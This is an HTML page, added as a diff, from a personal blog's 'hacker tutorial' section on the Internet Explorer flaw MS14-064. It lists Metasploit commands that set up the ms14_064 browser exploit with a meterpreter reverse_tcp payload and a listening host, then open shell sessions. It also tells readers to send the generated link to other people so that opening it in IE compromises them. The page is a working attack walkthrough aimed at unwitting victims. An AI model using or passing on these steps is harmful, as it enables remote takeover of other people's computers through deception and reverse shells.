@@ -1,0 +1,135 @@
+﻿<!DOCTYPE html>
+<html lang="en">
+ <head>
+  <meta charset="UTF-8">
+  <meta name="Generator" content="EditPlus®">
+  <meta name="Author" content="">
+  <meta name="Keywords" content="">
+  <meta name="Description" content="">
+  <title>成宝博文-ms14-064浏览器远程代码执行漏洞</title>
+    <!--引入基础库-->
+    <meta name='viewport' content='width=device-width,minimum-scale=1.0 maximum-scale=1.0 user-scalable=no' /> 
+ <!-- bootstrap基础文件 -->
+<link href="https://cdn.bootcdn.net/ajax/libs/twitter-bootstrap/3.4.1/css/bootstrap.min.css" rel="stylesheet">
+<script src="https://cdn.bootcdn.net/ajax/libs/jquery/2.1.4/jquery.min.js"></script>
+<script src="https://cdn.bootcdn.net/ajax/libs/twitter-bootstrap/3.4.1/js/bootstrap.min.js"></script>
+   <!-- 结束 -->
+   <!-- 图片懒加载库 -->
+  <script src="https://cdn.bootcdn.net/ajax/libs/jquery.lazyload/1.9.1/jquery.lazyload.min.js"></script>
+  <script src="../js/publicjs.js"></script><!-- 公共js代码 -->
+  <link href="../css/publiccss.css" rel="stylesheet"><!-- 公共css代码 -->
+  <!-- 妹子框架 -->
+   <!-- <script src="https://cdn.bootcdn.net/ajax/libs/amazeui/2.7.2/css/amazeui.min.css"></script>  -->
+  <!-- 结束 -->
+  <style>
+    	/*在超小屏幕下 手机 小于768px布局容器的宽度为100%*/
+	@media screen and (max-width: 767px){
+	        /*.img{width:100%;}*/
+	    }
+    /*小屏幕 平板电脑 大于等于768px 布局容器改为750px*/
+    	@media screen and (min-width: 768px){
+	      .lazy{height:500px;height:500px;} 
+	    }
+   /*中等屏幕 992px 布局容器改为970px*/
+       	@media screen and (min-width: 992px){
+	      .lazy{height:500px;height:500px;} 
+	    }
+       /*大屏幕 大于1200px 布局容器改为1170px*/
+	    @media screen and (min-width: 992px){
+	     .lazy{height:500px;height:500px}   .
+	  }
+  </style>
+ </head>
+ <body>
+        <!-- 顶部移动端PC端适配菜单栏 -->
+<nav class="navbar navbar-default" role="navigation">
+    <div class="container-fluid"> 
+    <div class="navbar-header">
+        <button type="button" class="navbar-toggle" data-toggle="collapse"
+                data-target="#example-navbar-collapse">
+            <span class="sr-only">切换导航</span>
+            <span class="icon-bar"></span>
+            <span class="icon-bar"></span>
+            <span class="icon-bar"></span>
+        </button>
+        <a class="navbar-brand" href="#">成宝个人网站</a>
+    </div>
+    <div class="collapse navbar-collapse" id="example-navbar-collapse">
+        <ul class="nav navbar-nav">
+            <li class="active"><a href="../index.html">首页</a></li>
+        </ul>
+    </div>
+    </div>
+</nav>
+ <!-- 菜单结束 -->
+ <!-- 选择主题 -->
+<div class="style-btn">
+<h4>选择主题</h4>
+<button type="button" class="btn btn-default de-style" onclick="green()">护眼绿</button>
+<button type="button" class="btn btn-default dark-style" onclick="dark()">暗黑模式</button>
+</div>
+<!-- 结束 -->
+<!-- 面包屑导航 -->
+<ul class="breadcrumb">
+    <li><a href="#">首页</a></li>
+    <li><a href="#">黑客教程</a></li>
+    <li class="active">ms14-064</li>
+</ul>
+<!-- 面包屑提示结束 -->
+<!-- 正文 -->
+     <div class="container">
+	              <h1>ms14-064浏览器远程代码执行漏洞</h1>
+					<div class="panel panel-success">
+						<div class="panel-heading">
+							<h3 class="panel-title">简介</h3>
+						</div>
+						<div class="panel-body">
+							ms14-064是IE浏览器的一个远程代码执行漏洞,漏洞仅仅能够在部分IE浏览器里面成功攻击
+						</div>
+					</div>
+		        	<div class="panel panel-success">
+						<div class="panel-heading">
+							<h3 class="panel-title">攻击步骤:</h3>
+						</div>
+						<div class="panel-body">
+							<h4>msfconsole<span style="color:green;">#打开控制台</span></h4>
+							<h4>search ms14-064<span style="color:green;">#搜索模块</span></h4>
+							<h4>use exploit/windows/browser</h4>
+                            <h4>/ms14_064_ole_code_execution<span style="color:green;">#使用模块</span></h4>
+							<h4>show options<span style="color:green;">#选项</span></h4>
+							<h4>set AllowPowershellPrompt true<span style="color:green;">#设置第一步</span></h4>
+							<h4>set SRVHOST 192.168.0.106<span style="color:green;">#设置为本地ip</span></h4>
+							<h4>set playload windows/meterpreter/reverse_tcp</h4>
+							<h4>set LHOST 192.168.0.106<span style="color:green;">#本地IP</span></h4>
+							<h4>set target 1<span style="color:green;">#目标1为windows7</span></h4>
+							  <h4>run<span style="color:green;">#开始</span></h4>
+							<h4>sessions查看连接的</h4>
+							<h4>sessions -i 4</h4>
+							<h4>sessions 4 开始连接</h4>
+							<h4>生成链接(在Using URL显示):</h4>
+							<h4>http://192.168.0.106:8080/emjjhj</h4>
+						</div>
+					</div>
+					<img class="lazy" data-original="img/bro1.webp"> 
+					<a class = "look" href="img/bro1.webp">查看高清大图</a>
+                  <h4>把Using URL这个链接发给别人让别人拿IE浏览器打开链接,别人可能就中招了</h4>
+					<h4>攻击是不可能百分百成功的有时候会可能因为你攻击的方式不对,各种操作系统环境因素导致攻击失败成不成功是不确定的</h4>
+				  <!-- <img class="lazy" data-original="https://img.52z.com/upload/news/image/20200421/20200421121630_33367.jpg">  -->
+	</div>
+   <!-- 正文结束 -->
+	 <!-- ----------------底部面板------------------------ -->
+ <div class="panel panel-success">
+    <div class="panel-heading">
+        <h3 class="panel-title">温馨提示</h3>
+    </div>
+    <div class="panel-body">
+         <p>欢迎收藏哦</p>
+		<strong>如有问题请联系作者微信:<span style="color:red;">HA2765441358</span></strong>
+    </div>
+</div>
+<!-------------- 面板结束--------------------------- -->
+ </body>
+ <script>
+	
+ </script>
+</html>
